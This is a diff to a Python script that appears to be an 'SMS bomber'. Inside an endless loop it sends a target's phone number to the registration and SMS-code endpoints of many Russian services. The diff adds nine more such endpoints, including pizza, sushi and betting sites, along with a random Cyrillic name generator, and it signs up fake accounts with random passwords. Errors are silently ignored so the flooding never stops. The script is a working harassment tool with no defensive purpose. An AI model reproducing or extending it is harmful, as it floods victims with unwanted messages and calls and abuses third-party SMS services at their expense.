@@ -16,6 +16,7 @@ if _phone[0] == '9':
 _name = ''
 for x in range(12):
   _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+  russian_name = _name + random.choice(list('йцукенгшщзхъфывапролджэячсмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБ'))
   password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
   username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 _phone9 = _phone[1:]
@@ -328,5 +329,41 @@ while True:
     requests.post('https://plink.tech/register/',json={"phone": _phone})
   except:
     pass
+  try:
+  	requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + _phone9})
+  except:
+  	pass
+  try:
+  	requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": _phone})
+  except:
+  	pass
+  try:
+  	requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": _phone,})
+  except:
+  	pass
+  try:
+  	requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + _phone, "ajax_demo_send": "1"})
+  except:
+  	pass
+  try:
+  	requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": "+" + _phone})
+  except:
+  	pass
+  try:
+  	requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29", data={"caller_number": _phone})
+  except:
+  	pass
+  try:
+  	requests.post("https://mousam.ru/api/checkphone", data={"phone": _phone, "target": "android app v0.0.2"})
+  except:
+  	pass
+  try:
+  	requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": russian_name, "phone": _phone})
+  except:
+  	pass
+  try:
+  	requests.post("https://ggbet.ru/api/auth/register-with-phone", data={"phone": "+" + _phone, "login": email, "password": password, "agreement": "on", "oferta": "on"})
+  except:
+  	pass
   iteration += 1
   print(('{} круг пройден.').format(iteration))
